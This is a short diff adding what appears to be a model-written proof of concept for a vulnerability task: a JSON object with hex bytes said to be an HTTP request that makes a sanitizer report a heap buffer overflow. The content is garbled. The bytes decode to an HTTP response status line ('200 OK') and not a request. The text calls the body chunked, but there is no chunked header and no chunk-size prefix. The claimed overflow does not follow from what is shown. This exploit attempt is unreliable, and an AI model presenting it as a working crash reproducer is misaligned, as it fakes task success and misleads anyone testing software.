@@ -1,0 +1,11 @@
+Here is a concrete HTTP request that exercises the vulnerability:
+
+```json
+{
+  "hex_bytes": "48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a 20 31 30 30 0d 0a 0d 0a 61 62 0d 0a",
+  "explanation": "The request line is HTTP/1.1 200 OK. The Content-Length is 100. The body is 'ab'. The body is chunked with each chunk prefixed by its hexadecimal length (in hex), followed by the data, and ending with a CRLF.",
+  "expected_effect": "The sanitizer should report a heap buffer overflow, as the read byte is one byte past the buffer."
+}
+```
+
+This request triggers the vulnerability by sending a chunked body with a single chunk "ab". The sanitizer should report a heap buffer overflow, as the read byte is one byte past the buffer.
